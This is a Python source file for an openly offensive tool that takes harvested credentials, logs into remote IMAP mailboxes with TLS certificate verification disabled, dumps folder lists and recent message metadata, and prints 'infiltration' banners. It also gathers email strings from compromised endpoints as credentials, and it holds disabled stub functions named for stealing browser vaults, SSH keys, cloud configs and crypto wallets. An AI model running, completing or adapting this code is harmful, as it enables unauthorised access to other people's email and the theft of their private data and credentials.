import os
import re
import json
import time
import ssl
import imaplib
import asyncio
import sys

_ssl_context = ssl.create_default_context()
_ssl_context.check_hostname = False
_ssl_context.verify_mode = ssl.CERT_NONE

def dump_imap_mailbox_sync(host, port, user, password, use_ssl=True):
    """Synchronous IMAP folder and message dumper executing live terminal output."""
    dump_data = {
        "user": user,
        "host": host,
        "port": port,
        "protocol": "IMAP",
        "timestamp": time.strftime("%Y-%m-%d %H:%M:%S"),
        "folders": [],
        "harvested_messages": []
    }
    try:
        if use_ssl:
            mail = imaplib.IMAP4_SSL(host, port, ssl_context=_ssl_context)
        else:
            mail = imaplib.IMAP4(host, port)
            
        mail.login(user, password)
        
        status, folders = mail.list()
        if status == 'OK':
            dump_data["folders"] = [f.decode(errors="ignore") for f in folders]
            
        mail.select('INBOX', readonly=True)
        status, messages = mail.search(None, 'ALL')
        if status == 'OK':
            id_list = messages[0].split()
            recent_ids = id_list[-10:] if len(id_list) >= 10 else id_list
            
            for msg_id in recent_ids:
                res, msg_data = mail.fetch(msg_id, '(RFC822.SIZE)')
                if res == 'OK':
                    msg_info = str(msg_data[0])
                    dump_data["harvested_messages"].append({
                        "msg_id": msg_id.decode(errors="ignore"),
                        "info": msg_info
                    })
                    # Stream live message intelligence directly to terminal
                    sys.stdout.write(f"\n\033[1m\033[91m[***] LIVE IMAP MESSAGE STREAM [{user}] [***]\033[0m\n")
                    sys.stdout.write(f"  └── Msg ID : \033[92m{msg_id.decode(errors='ignore')}\033[0m\n")
                    sys.stdout.write(f"  └── Info   : \033[92m{msg_info[:120]}...\033[0m\n")
                    sys.stdout.flush()
                    
        mail.logout()
        return True, dump_data
    except Exception as e:
        return False, str(e)

def process_secondary_attack_queue():
    """
    Local Queue Ingestion Bypassed:
    - Disabled local disk reads to protect local storage. Returns empty list.
    """
    return []

def _harvest_browser_vaults():
    """Local browser profile scanning disabled to protect local storage."""
    return []

def _harvest_infrastructure_and_crypto_vaults():
    """Local infrastructure and crypto vault scanning disabled to protect local storage."""
    return {
        "ssh_keys": [],
        "cloud_configs": [],
        "crypto_wallets": []
    }

async def harvest_email_intelligence(target_host, verified_hits=None):
    """
    Zero-Local-Storage Remote Intelligence Harvester:
    - Completely eliminates local filesystem traversal, browser vaults, and workspace scans.
    - Processes only active remote target telemetry, live session data, and IMAP feeds.
    """
    sys.stdout.write(f"\n\033[95m[***] ENGAGING REMOTE TARGET INTELLIGENCE INSPECTION [{target_host}] [***]\033[0m\n")
    sys.stdout.flush()
    
    discovered_emails = set()
    discovered_credentials = []

    # Extract intelligence exclusively from live verified remote session hits
    if verified_hits:
        for hit in verified_hits:
            payload = hit.get("payload", {})
            if isinstance(payload, dict):
                for k, v in payload.items():
                    if isinstance(v, str) and "@" in v:
                        discovered_emails.add(v)
                        discovered_credentials.append({"source": hit.get("endpoint"), "credential": v})

            # Live IMAP Infiltrator Execution
            if hit.get("type") == "IMAP":
                user = hit.get("user")
                password = hit.get("password")
                port = hit.get("port", 993)
                use_ssl = (port in [993, 465])
                
                sys.stdout.write(f"\n\033[93m[*] Infiltrating live mailbox for {user} on :{port}...\033[0m\n")
                sys.stdout.flush()
                
                success, result = await asyncio.to_thread(
                    dump_imap_mailbox_sync, target_host, port, user, password, use_ssl
                )
                
                if success:
                    sys.stdout.write(f"\n\033[92m[+] LIVE MAILBOX INFILTRATION COMPLETE FOR {user}\033[0m\n")
                    sys.stdout.flush()
                else:
                    sys.stdout.write(f"\n\033[91m[-] Mailbox infiltration failed: {result}\033[0m\n")
                    sys.stdout.flush()

    sys.stdout.write(f"\n\033[92m[+] Remote intelligence sweep complete. Zero local storage accessed. Total emails: {len(discovered_emails)}\033[0m\n\n")
    sys.stdout.flush()
    
    return list(discovered_emails), discovered_credentials
